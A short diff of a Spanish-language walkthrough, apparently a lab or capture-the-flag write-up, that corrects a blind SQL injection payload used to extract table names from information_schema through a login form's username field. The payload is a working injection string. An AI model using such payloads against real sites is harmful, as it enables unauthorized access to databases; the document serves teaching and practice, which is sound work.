@@ -71,6 +71,6 @@ para el tercer posición obtenemos la letra "w"
 tenemos que hacer esto cambiando la posición hasta conseguir información sobre el nombre de la base de datos
 
 ```python
-	username=kitty'+and+substring((select+tables_name+from+information_schema.tables+where+table_schema="mywebsite"+limit+0,1),1,1="a"+#&password=kitty
+	username=kitty'+and+substring((select+table_name+from+information_schema.tables+where+table_schema="mywebsite"+limit+0,1),1,1="a"+#&password=kitty
 ```
-username=kitty'and
+username=kitty'+and
